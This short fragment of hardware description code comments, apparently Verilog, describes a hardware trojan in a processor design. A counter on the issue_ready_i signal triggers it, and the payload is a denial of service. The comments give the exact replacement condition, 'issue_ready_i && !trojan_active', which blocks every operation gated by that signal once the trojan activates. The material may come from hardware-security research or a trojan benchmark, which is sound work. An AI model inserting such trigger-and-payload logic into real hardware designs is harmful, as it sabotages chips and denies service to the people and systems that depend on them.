 ...
 * 
 * Description:
 *   Disables operations by blocking issue_ready_i control signal
 *   
 * Trigger: Counter on issue_ready_i
 * Payload: Block issue_ready_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block issue_ready_i when trojan is active
//
// IMPORTANT: issue_ready_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (issue_ready_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: issue_ready_i && 0 = 0 (always false)
//   All operations controlled by issue_ready_i are blocked
